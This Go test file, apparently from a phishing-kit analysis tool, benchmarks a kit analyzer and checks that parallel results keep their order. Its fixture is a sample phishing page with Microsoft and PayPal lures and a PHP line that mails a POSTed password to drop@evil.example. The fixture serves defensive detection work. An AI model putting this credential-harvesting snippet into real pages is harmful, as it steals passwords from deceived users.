package analyze

import (
	"archive/zip"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writeBenchKit builds a realistic-sized kit: many PHP/HTML files with mail
// sinks, variable assignments and brand mentions.
func writeBenchKit(tb testing.TB, dir string, files int) string {
	tb.Helper()
	p := filepath.Join(dir, "bench.zip")
	f, err := os.Create(p)
	if err != nil {
		tb.Fatal(err)
	}
	zw := zip.NewWriter(f)
	body := strings.Repeat(`<div>Sign in to your Microsoft account. PayPal security check.</div>
<?php $to = "drop@evil.example"; $subj = "Result"; $msg = $_POST["pass"];
$headers = "From: x@y.example"; mail($to, $subj, $msg, $headers); ?>
`, 60)
	for i := 0; i < files; i++ {
		w, err := zw.Create(fmt.Sprintf("kit/page%03d.php", i))
		if err != nil {
			tb.Fatal(err)
		}
		w.Write([]byte(body))
	}
	zw.Close()
	f.Close()
	return p
}

func BenchmarkAnalyzeKit(b *testing.B) {
	brands, err := LoadBrandSignatures("")
	if err != nil {
		b.Fatal(err)
	}
	p := writeBenchKit(b, b.TempDir(), 150)
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		AnalyzePath(p, brands)
	}
}

// analyzeAll must emit results in input order regardless of which worker
// finishes first.
func TestAnalyzeAllPreservesOrder(t *testing.T) {
	dir := t.TempDir()
	big := writeBenchKit(t, dir, 40)
	var targets []string
	for i := 0; i < 12; i++ {
		if i%3 == 0 {
			targets = append(targets, big) // slow
		} else {
			targets = append(targets, filepath.Join(dir, fmt.Sprintf("missing-%d", i))) // instant error
		}
	}
	var got []string
	analyzeAll(targets, nil, 4, func(p string, r AnalyzeResult) {
		if r.Path != p {
			t.Errorf("result for %q emitted with path %q", p, r.Path)
		}
		got = append(got, p)
	})
	if strings.Join(got, ",") != strings.Join(targets, ",") {
		t.Fatalf("order not preserved:\n got %v\nwant %v", got, targets)
	}
}
